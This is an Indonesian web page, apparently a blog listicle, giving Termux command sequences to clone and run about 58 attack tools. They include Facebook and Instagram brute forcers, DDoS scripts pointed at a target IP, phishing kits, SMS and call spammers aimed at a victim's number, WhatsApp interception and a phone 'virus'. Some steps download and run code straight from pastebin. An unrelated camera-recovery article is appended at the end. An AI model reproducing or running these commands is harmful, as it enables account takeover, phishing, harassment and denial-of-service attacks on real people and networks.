@@ -1,0 +1,560 @@
+ode Termux Hack Facebook target
+$apt update && apt upgrade (tekan enter)
+$apt install git (tekan enter)
+$apt install python2 (tekan enter)
+$pip2 install mechanize (tekan enter)
+$git clone https://github.com/FR13ND8/BRUTEFORCEnew, (tekan enter)
+$cd BRUTEFORCEnew (tekan enter)
+$sh new.sh (tekan enter)
+2. Script Termux Hack Instagram
+$pkg install nano (tekan enter)
+$pkg install figlet  (tekan enter)
+$pkg install python2 (tekan enter)
+$pip2 install lolcat (tekan enter)
+$pkg install cowsay (tekan enter)
+$pkg install git (tekan enter)
+$git clone https://github.com/darkcurut08/darkcurut08 (tekan enter)
+$cd darkcurut08 (tekan enter)
+$sh Moreno77.sh (tekan enter)
+3. Termux Script Hack Facebook
+$apt update && apt upgrade (tekan enter)
+$pkg ins toilet (tekan enter)
+$pkg ins figlet (tekan enter)
+$pkg ins ruby (tekan enter)
+$pkg ins gem (tekan enter)
+$gem ins lolcat (tekan enter)
+$pkg ins php (tekan enter)
+$pkg ins python2 (tekan enter)
+$pkg ins git (tekan enter)
+$git clone https://github.com/Rusmana-ID/rus, (tekan enter)
+$cd rus (tekan enter)
+$sh v2.sh (tekan enter)
+4. Tools Termux Script Sadap FB
+$apt update && apt upgrade (tekan enter)
+$apt install php git (tekan enter)
+$apt install bash (tekan enter)
+$git clone https://github.com/MrTamfanX/TamfanFacebook (tekan enter)
+$cd TamfanFacebook (tekan enter)
+$chmod +x * (tekan enter)
+$chmod -R 775 lib (tekan enter)
+$sh install.sh (tekan enter)
+$sh tamfan.sh (tekan enter)
+5. Script Termux DDOS Attack WiFi
+$apt update && apt upgrade (tekan enter)
+$apt install python2 (tekan enter)
+$apt install git (tekan enter)
+$cd LITEDDOS (tekan enter)
+$python2 LITEDDOS.py [IP target] 80 100 (tekan enter)
+6. Script Termux DDos Attack HP Orang
+$apt update && apt upgrade (tekan enter)
+$pkg install python2 (tekan enter)
+$pip2 install mechanize (tekan enter)
+$pip2 install request (tekan enter)
+$pkg install git (tekan enter)
+$git clone https://github.com/R133F/Trojans (tekan enter)
+$cd Trojans (tekan enter)
+$python2 trojans.py (tekan enter)
+7. Script Termux Sc SocialFish Phising
+$pkg install curl (tekan enter)
+$pkg install python (tekan enter)
+$pkg install python2 (tekan enter)
+$pkg install wget (tekan enter)
+$pkg install php (tekan enter)
+$git clone https://github.com/An0nUD4Y/SocialFish (tekan enter)
+$ls (tekan enter)
+$cd SocialFish (tekan enter)
+$ls (tekan enter)
+$pip2 install -r requirements.txt (tekan enter)
+$pip2 install requests (tekan enter)
+$python3 SocialFish.py (tekan enter)
+8. Script Termux Darkfly
+$apt-get update (tekan enter)
+$apt-get upgrade (tekan enter)
+$Pkg install python (tekan enter)
+$Pkg install python2 (tekan enter)
+$pkg install git (tekan enter)
+$git clone https://github.com/ Ranginang67/DarkFly-Tool (tekan enter)
+$cd DarkFly-Tool (tekan enter)
+$ls (tekan enter)
+$chmod +x * (tekan enter)
+$python2 install.py (tekan enter)
+9. Kode Termux Tampilan Oh My Zsh
+$apt update && apt upgrade (tekan enter)
+$apt install git (tekan enter)
+$git clone https://github.com/Cabbagec/termux-ohmyzsh (tekan enter)
+$cd termux-ohmyzsh (tekan enter)
+$sh install.sh (tekan enter)
+10. Script Termux Hack WiFi
+$apt update (tekan enter)
+$apt upgrade (tekan enter)
+$apt install git (tekan enter)
+$git clone https://github.com/esc0rtd3w/wifi-hacker (tekan enter)
+$ls (tekan enter)
+$cd wifi-hacker (tekan enter)
+$ls (tekan enter)
+$chmod +x wifi-hacker.sh
+$ls (tekan enter)
+$./wifi-hacker.sh (tekan enter)
+11. Script Termux Spam v1
+Ada 2 script spam sms termux, lihat kode dibawah ini.
+
+$pkg install git php python2 cowsay figlet toilet ruby (tekan enter)
+$gem install lolcat (tekan enter)
+$pip2 install toilet (tekan enter)
+$pip2 install lolcat (tekan enter)
+$pkg install php (tekan enter)
+$git clone https://github.com/GU NAWAN18ID/B3604-spam-v1.git (tekan enter)
+$cd B3604-spam-v1 (tekan enter)
+$bash B3604-spam.sh (tekan enter)
+12. Script Termux Spam SMS
+$apt install git (tekan enter)
+$apt install php (tekan enter)
+$apt install nano (tekan enter)
+$apt install python2 (tekan enter)
+$pip2 install requests (tekan enter)
+$pip2 install mechanize (tekan enter)
+$git clone https://github.com/Senitopeng/SpamSms.git (tekan enter)
+$cd SpamSms (tekan enter)
+13. Script Termux Mod Caping
+$apt update && apt upgrade (tekan enter)
+$apt install git (tekan enter)
+$apt install php (tekan enter)
+$git clone https://github.com/anggaid14/caping (tekan enter)
+$cd caping (tekan enter)
+$ls (tekan enter)
+$php run.php (tekan enter)
+14. Script Termux DDOS Attack
+$pkg update && pkg upgrade (tekan enter)
+$pkg install python (tekan enter)
+$pkg install git (tekan enter)
+$git clone https://github.com/cyweb/hammer (tekan enter)
+$cd hammer (tekan enter)
+$ls (tekan enter)
+$python hammer.py (tekan enter)
+$python hammer.py -s [IP target] -p (tekan enter)
+$[Port] -t 135 (tekan enter)
+Baca Cara DDOS Attack di Termux
+
+15. Script Termux Virus HP
+$pkg update && pkg upgrade (tekan enter)
+$pkg install git (tekan enter)
+$git clone https://github.com/Hider5/Malicious (tekan enter)
+$ls (tekan enter)
+$cd Malicious (tekan enter)
+$ls (tekan enter)
+$pip2 install -r requirements.txt (tekan enter)
+$chmod 777 malicious.py (tekan enter)
+$ls (tekan enter)
+$python2 malicious.py (tekan enter)
+Baca Cara Membuat Virus Termux Berbahaya
+
+16. Script Termux Mod Cashtree
+$pkg update && pkg upgrade (tekan enter)
+$pkg install php (tekan enter)
+$pkg install git (tekan enter)
+$pkg install nano (tekan enter)
+$git clone https://github.com/radenvodka/cashtree (tekan enter)
+$cd cashtree (tekan enter)
+$ls (tekan enter)
+$nano cashtree.php (tekan enter)
+$php cashtree.php (tekan enter)
+17. Script Termux 200 Tool
+$apt update && apt upgrade –y (tekan enter)
+$apt install git (tekan enter)
+$apt install php (tekan enter)
+$apt install curl (tekan enter)
+$apt install ruby (tekan enter)
+$apt install figlet (tekan enter)
+$apt install python2 (tekan enter)
+$gem install lolcat (tekan enter)
+$git clone https://github.com/TUANB4DUT/TOOLSINSTALLERv3 (tekan enter)
+$cd TOOLSINSTALLERv3 (tekan enter)
+$chmod +x TUANB4DUT.sh (tekan enter)
+$sh TUANB4DUT.sh (tekan enter)
+$apt install update (tekan enter)
+$apt install upgrade (tekan enter)
+$pip2 install termcolor (tekan enter)
+$pip2 install lolcat (tekan enter)
+$apt install toilet (tekan enter)
+$apt install git (tekan enter)
+$git clone https://github.com/DarknessCyberTeam/BAJINGANv6 (tekan enter)
+$cd BAJINGANv6 (tekan enter)
+$sh BAJINGAN.sh (tekan enter)
+Username: BAJINGAN
+
+Password: Gans
+
+18. Script Termux Auto Like Instagram
+$pkg install git (tekan enter)
+$pkg install nodejs (tekan enter)
+$git clone http://github.com /rrudy0966/instatools (tekan enter)
+$cd instatools (tekan enter)
+$unzip node_modules.zip (tekan enter)
+$pkg install nodejs lts (tekan enter)
+$npm install instagram-private-api (tekan enter)
+$node index (tekan enter)
+19. Script Termux Brute Force
+$pkg update (tekan enter)
+$pkg upgrade (tekan enter)
+$apt install python2 (tekan enter)
+$pkg install locat (tekan enter)
+$pkg install toilet (tekan enter)
+$pkg install git (tekan enter)
+$pip2 install request (tekan enter)
+$pip2 install mechanize (tekan enter)
+$git clone https://github. com/0M3STG4NT3N6/refploit (tekan enter)
+$cd refploit (tekan enter)
+$is (tekan enter)
+$chmod +x* (tekan enter)
+$is (tekan enter)
+$bash rt.sh (tekan enter)
+20. Script Termux Hack IG
+$apt update && apt upgrade (tekan enter)
+$pkg install python (tekan enter)
+$pkg install git (tekan enter)
+$pkg install nano (tekan enter)
+$git clone https://github.com/avramit/instahack.git (tekan enter)
+$ls (tekan enter)
+$cd instahack (tekan enter)
+$ls (tekan enter)
+$pip install requests (tekan enter)
+$cd instahack (tekan enter)
+$nano pass.txt (tekan enter)
+$cat pass.txt (tekan enter)
+$ls (tekan enter)
+$python hackinsta.py (tekan enter)
+Baca 2 Script Hack IG Termux
+
+21. Script Termux Lacak IP
+$git clone https://github.com/maldevel/IPGeolocation (tekan enter)
+$cd IPGeolocation (tekan enter)
+$chmod +x ipgeolocation.py (tekan enter)
+$pip install -r requirements.txt (tekan enter)
+$python ipgeolocation.py –m (tekan enter)
+$python ipgeolocation.py -t IP yang ingin dilacak (tekan enter)
+22. Script Termux DDOS Via Termux
+$pkg update (tekan enter)
+$pkg upgrade (tekan enter)
+$pkg install python (tekan enter)
+$pkg install git (tekan enter)
+$git clone https://github.com/cyweb/hammer (tekan enter)
+$cd hammer (tekan enter)
+$python hammer.py (tekan enter)
+$python hammer.py -s [IP target] -p [port] -t 135 (tekan enter)
+23. DDOS HAMMER
+$pkg update && pkg upgrade
+$pkg install python git
+$git clone https://github.com/cyweb/hammer
+$cd hammer
+$python hammer.py
+$python hammer.py -s [IP target] -p [PORT] -t 135
+24. DDOS XERXES
+‌$ apt install git
+$ apt install clang
+$ git clone
+$ ls
+$ cd xerxes
+$ ls
+$ clang xerxes.c -o xerxes
+$ ls
+$ ./xerxes (website url) 80
+25. Script Termux Spam SMS
+$pkg install php curl
+$pkg install curl
+$curl https://pastebin.com/raw/9BYy1JVc -o jdid.php
+$php jdid.php
+26. Script Termux Spam Call
+$apt update && apt upgrade
+$pkg install php
+$pkg install git
+$git clone https://github.com/storiku/Call
+$cd Call
+$php spamcall.phpLalu masukan no hp korban
+Baca Script Spam Call Termux
+
+27. Script Termux Lacak Lokasi
+$apt update
+$apt upgrade
+$pkg install python git
+$git clonehttps://github.com/maldevel/IPGeoLocation
+$cd IPGeoLocation
+$chmod +x ipgeolocation.py
+$pip install -r repuirements.txt
+$python ipgeolocation.py -m
+$python ipgeolocation.py -h
+$python ipgeolocation.py -t 10.99.110.220
+Baca Script Termux Lacak Lokasi HP Orang Lain
+
+28. Script Termux Sadap WhatsApp
+$ pkg install git python2
+$ git clone https://github.com/Bl4ckDr460n/HxWhatsApp
+$ cd HxWhatsapp
+$chmod +x HxWhatsApp
+$ python2 HxWhatsApp.py
+29. Script Termux Konek WIFI tanpa Password
+$apt update && apt upgrade
+$pkg install git
+$git clone https://github.com/esc0rtd3w/wifi-hacker
+$cd wifi-hacker/
+$chmod +x wifi-hacker.sh
+$./wifi-hacker.sh
+30. Script Termux Phising Akun Gmail
+$apt-get update && apt-get upgrade
+$apt-get install git
+$apt-get install python python-pip python-setuptools
+$pip install scapy
+$git clone https://github.com/wifiphisher/wifiphisher.git
+$cd wifiphisher<
+$python setup.py install
+$cd wifiphisher
+$python wifiphisher
+31. Script Termux MBF
+$pkg install python2
+$apt install git
+$git clonehttps://github.com/pirmansx/mbf
+$cd mbf
+$pip2 install mechanize
+$python2 MBF.py
+Baca Cara Hack FB dengan MBF Termux Facebook Tools
+
+32. Script Termux Bruteforce Instagram
+$apt update && apt upgrade
+$pkg install python git nano
+$git clone
+$cd instahack
+$pip install requests
+$cd instahack
+$nano pass.txt
+$cat pass.txt
+$python hackinsta.py
+33. Script Termux OSIF
+$pkg install python2
+$git clone https://github.com/ciku370/OSIF
+$cd OSIF
+$pip2 install -r requirements.txt
+$python2 osif.py
+34. Script Termux Darkfly Tools
+$apt-get update
+$apt-get upgrade
+$pkg install python
+$pkg install python2
+$pkg install git
+$git clone https://github.com/Ranginang67/DarkFly-Tool
+$cd DarkFly-Tool
+$ls
+$chmod +x *
+$python2 install.py
+35. Script Termux Tools Nethunter
+$apt update
+$apt install git
+$git clone https://github.com/Hax4us/Nethunter-In-Termux.git
+$cd Nethunter
+$chmod +x kalinethunter
+$./kalinethunter
+$./startkali.sh
+36. Script Termux Admin Finder
+$apt update && apt upgrade
+$pkg install python2 git
+$git clone https://github.com/AdheBolo/AdminFinder
+$cd AdminFinder
+$chmod 777 AdminFinder.py
+$python2 AdminFinder.py
+$Tool Mr.Rv1.1
+$apt update && apt upgrade
+$pkg install git gem figlet lolcat
+$git clone https://github.com/Mr-R225/Mr.Rv1.1
+$cd Mr.Rv1.1
+$sh Mr.Rv1.1.sh
+37. Script Termux Install Webdav
+$apt update && upgrade
+$apt install python2 openssl curl libcurl
+$pip2 install urllib3 chardet certifi idna requests
+$ln -s /sdcard
+$cd sdcard
+$mkdir webdav
+$cd webdav
+$curl -k -O https://pastebin.com/raw/HnVyQPtR
+$mv HnVyQPtR webdav.py
+$python2 webdav.py
+38. Script Termux Phising Mobile Legends
+$git clone
+$cd PhisingGame
+$python2 phising.py
+Result ->
+$cd PhisingGame
+$cat buku.txt
+39. Script Termux Bot Auto Reaction Facebook
+$git clone https://github.com/AMVengeance/FB-React.git
+$chmod +x FB-React -R
+$cd FB-React
+$./start
+40. Kode Termux Bot Love Instagram
+$git clone https://github.com/indogram/indotagram.git
+$php indotagram/login.php
+41. Script Termux Cara Chat di Termux
+$pkg install irssi
+$irssi
+$/connect chat.freenode.net
+$/nick bebas
+42. Auto Report FB Termux
+Lihat disini Script Auto Report Facebook Termux.
+
+Lihat disini Phising FF Termux.
+
+44. Hack Kuota Telkomsel Termux
+Lihat disini Cara Hack Kuota Telkomsel dengan Termux.
+
+45. Bug Internet Termux Gratis
+di
+46. Script Termux Spam WA
+Lihat disini Kode Script Spam WA Termux
+
+47. Script Deface Termux
+Lihat disini Deface Menggunakan Exploiter WebDav Termux.
+
+48. Script Pulsa Termux
+Lihat disini Script Termux Hack Pulsa.
+
+49. Hack Pulsa Termux
+Lihat disini Cara Hack CCTV Termux.
+
+50. Hack Admin Login Termux
+Lihat Disini Cara Hack Admin Login Termux Menggunakan Script Blazy.
+
+51. Script Bot Like FB
+Lihat disini Script Bot Like FB Termux.
+
+52. Script Termux Sadap WA
+Lihat disini Script Termux Sadap WA.
+
+53. Script Hack Saldo Dana Termux
+Lihat disini Cara Hack Saldo Dana Pakai Termux.
+
+54. Script Diamond FF Termux
+Lihat disini Kode Hack Diamond FF dengan Script Diamond FF Termux.
+
+55. Bot Auto Comment FB
+Lihat disini Script Auto Comment FB Termux 2022, Bot Komen FB Work.
+
+56. Hack Kamera HP Termux
+Lihat disini Cara Hack Kamera HP Via Termux.
+
+57. Follower IG Termux
+Lihat disini Cara Hack Followers IG dengan Script Termux.
+
+58. Saldo GoPay Termux
+Lihat disini Cara Hack Saldo GoPay Via Termux.
+
+Untuk Script Termux lainnya kalian bisa lihat artikel kami yang lainnya.
+
+Jadi di atas merupakan kumpulan script Termux paling berguna atau Tools Termux 2023 dengan kegunaan yang berbeda-beda. Namun saya menyarankan agar Anda menggunakannya dengan bijak agar tidak merugikan orang lain.
+
+
+Semoga pembahasan ini bermanfaat dan jangan lupa baca juga artikel lainnya di situs ini. Terima kasih.
+
+Rekomendasi
+Script Hack FB No Login Menggunakan Termux 2023
+Script Spam Call Termux 2023 Work Terbaru
+Cara Hack Kuota Telkomsel dengan Termux 2023
+2 Script Hack IG Termux 2023 100% Work Terbaru di Android
+10 Script Hack FB Termux 2023 No Checkpoint+No Login+Masal
+5 Cara Hack FB Termux Tanpa Root 2023 untuk Pemula
+Script Termux Lacak Lokasi HP Orang Lain 2023
+Cara Install NMAP, HYDRA, REDHAWK di Termux
+Kode Hack Diamond FF dengan Script Diamond FF Termux 2023
+Script Bot Like & Reaction FB Termux 2023
+KategoriTeknologi
+TagAndroid, Dana, Deface, Diamond, Facebook, Followers, Google Play, Internet, Internet Gratis, Kuota, Linux, Mod, Password, Pulsa, Telkomsel, Termux, Twitter
+4 Cara Mengembalikan Kamera yang Hilang di HP Android
+
+Download Diamond ML Gratis 10000 APK + 100% Work 2022-2023
+
+Artikel Terbaru
+ZEPETO Mod Apk V3.27.000 Uang Permata Tak Terbatas 2023
+Simcity Buildit Mod Apk Unlimited Money Versi Terbaru 2023
+Proxyscrape Web Premium Free 2023
+Cara Buat Email dari HP Langsung Jadi 2023 (GMAIL)
+Download Cheat Harvest Moon Back To Nature Android Lengkap
+Cara Hack Saldo DOKU Gratis 2023
+Build Lylia Tersakit 2023 Full Damage
+YouTube Biru Link Download Mod Apk 2023
+Hypera Live Nonton BTS Online Tanpa Buffering 2023
+Download WA Immune Apk Kawhatsapp Anti Virtex 2023 Terbaru
+4 Cara Mengembalikan Kamera yang Hilang di HP Android - AC10 Tech
+
+Cara Mengembalikan Kamera yang Hilang di HP Android – Aplikasi kamera di smartphone android tentu memiliki peran yang sangat penting karena dengan menggunakan aplikasi kamera di hp android, maka kamu bisa menggunakan fitur kamera yang ada di hp android kamu.
+
+Namun, bagaimana jadinya jika aplikasi kamera di hp android kamu tiba-tiba hilang?
+
+Tentu hal tersebut akan sangat menjengkelkan karena kamu tidak menemukan aplikasi kamera.
+
+Hal tersebut bisa terjadi karena mungkin terdapat error pada smartphone android kamu.
+
+Cara Mengembalikan Kamera yang Hilang di HP Android
+Cara Mengembalikan Kamera yang Hilang
+Untuk kamu yang penasaran dengan cara mengembalikan aplikasi kamera yang hilang di hp oppo, vivo, atau xiaomi kamu, maka kamu bisa menyimak artikel ini supaya kamu tau cara untuk mengatasinya.
+
+Baca juga tentang Kenapa Google Play Store Tiba Tiba Hilang
+
+Berikut 4 Cara Mengembalikan Kamera yang Hilang di android dengan mudah.
+
+Daftar Konten
+
+4 Cara Mengembalikan Kamera yang Hilang di HP Android
+4 Cara Mengembalikan Kamera yang Hilang di HP Android
+Cara Mengatasi Aplikasi Kamera Di HP Android Yang Hilang
+Cara mengatasi aplikasi kamera di android yang hilang ini bisa menjadi referensi untuk kamu yang mungkin mengalami masalah tersebut di smartphone android kamu.
+
+Untuk cara Mengembalikan Kamera yang Hilang hp android oppo, xiaomi atau vivo kamu juga memiliki cara yang mudah dan bisa dilakukan oleh pemula. Di bawah ini 4 cara mengatasi aplikasi kamera di hp android yang hilang dengan mudah.
+
+1. Restart Android
+4 Cara Mengembalikan Kamera yang Hilang di HP Android
+4 Cara Mengatasi Aplikasi Kamera Di HP Android Yang Hilang Dengan Mudah
+Cara pertama untuk mengatasi aplikasi kamera yang hilang di hp android adalah dengan melakukan restart atau reboot di hp android kamu.
+
+Pasalnya, dengan melakukan restart atau reboot, maka sistem akan terefresh dan eror-eror yang terjadi sebelumnya bisa teratasi dengan seketika setelah melakukan restart di smartphone android kamu.
+
+Untuk melakukan restart pada hp android, maka kamu hanya perlu menekan tombol power di hp android kamu selama beberapa saat dan kamu pilih opsi restart atau reboot.
+
+Jika sudah, maka kamu tinggal tunggu hingga proses restart selesai dan hp android kamu kembali menyala. Jika sudah menyala, kamu bisa cek apa aplikasi kamera di hp android kamu sudah muncul atau belum.
+
+Baca juga cara atasi Aplikasi WhatsApp Tiba-Tiba Hilang
+
+2. Instal Aplikasi Kamera
+Cara kedua untuk mengatasi aplikasi kamera di hp android yang hilang adalah dengan menginstall ulang aplikasi kamera di hp android kamu.
+
+Kamu bisa mencari ulang aplikasi kamera bawaan asli di hp kamu, biasanya di situs firmware resmi sesuai type hp kamu.
+
+Jika kamu sudah download kamu bisa install.
+
+Jika kamu tak menemukan apk aplikasi bawaan sesuai merk type hp kamu, maka kamu harus install aplikasi kamera pihak ketiga.
+
+Kamu bisa download terlebih dahulu aplikasi kamera di hp android kamu dengan melalui aplikasi Google Play Store ataupun dengan menggunakan browser di smartphone android kamu.
+
+Setelah itu, kamu bisa install saja aplikasi kamera yang sudah kamu downlaod tadi di smartphone android kamu.
+
+Jika sudah, maka kamu bisa mengguankan fitur kamera di hp android kamu dengan menggunakan aplikasi kamera yang sudah download tadi.
+
+Kamu juga sudah bisa menemukan aplikasi kamera di layar menu hp android kamu.
+
+3. Hard Reset HP
+Cara terakhir untuk mengatasi aplikasi kamera yang hilang di hp android adalah dengan melakukan hard reset di smartphone android kamu.
+
+Dengan melakukan hard reset di hp android, maka seluruh apliaksi, file dan pengaturan akan tereset dan akan kembali seperti layaknya seperti baru dan aplikasi bawaan termasuk kamera bisa muncul kembali di hp android kamu.
+
+Untuk melakukan hard reset di hp android, maka kamu bisa masuk ke menu setting atau pengaturan dan kamu pilih opsi setel ulang.
+
+Setelah itu, kamu tap saja opsi kembali ke pengaturan pabrik, tunggu hingga proses hard reset selesai dengan sempurna.
+
+Jika sudah selesai, maka kamu sudah bisa menggunakan apliaksi kamera di hp android kamu lagi seperti biasa.
+
+Baca Juga Cara Mengembalikan Aplikasi Galeri Yang Hilang
+
+4. Install Ulang HP Android
+Cara terkahir jika semua cara diatas gagal, kamu bisa install ulang hp kamu. Dengan cara ini maka semua aplikasi bawaan android kamu yang hilang akan pulih kembali.
+
+Cara ini terbilang paling ampuh jika cara-cara sebelumnya belum juga membuahkan hasil.
+
+Namun cara ini perlu keahlian khusus jika kamu ingin lakukan sendiri, jika tidak kamu bisa membawa hp kamu ke tempat perbaikan hp atau service center oppo, atau xiaomi dll.
+
+Nah, itu dia 4 Cara Mengembalikan Kamera yang Hilang di HP android yang hilang dengan mudah yang bisa kamu coba lakukan di smartphone android kamu untuk memunculkan kembali aplikasi
